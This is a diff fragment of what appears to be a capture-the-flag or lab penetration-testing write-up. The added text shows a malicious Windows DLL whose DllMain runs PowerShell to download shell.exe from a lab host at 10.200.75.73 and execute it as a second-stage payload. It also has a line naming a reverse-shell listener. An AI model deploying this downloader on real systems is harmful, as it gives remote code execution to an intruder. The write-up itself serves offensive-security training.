@@ -781,5 +781,25 @@ Final size of exe file: 8704 bytes
 So first ill create the second stage
 
 ```python
+#include <windows.h>
+		
+#pragma comment(lib, "user32.lib")
+		
+BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
+{
+	switch (fdwReason)
+	{
+		case DLL_PROCESS_ATTACH:
+		    WinExec("powershell -c wget http://10.200.75.73/shell.exe -o C:/Temp && shell.exe", SW_SHOW);
+		    break;
+	}
+		
+	return TRUE;
+}
+```
 
+Ill modify the C code to do a wget since i know that works, then pull the second stage and output it to `C:\Temp` and then finally execute it
+
+```python
+penelope op 
 ```
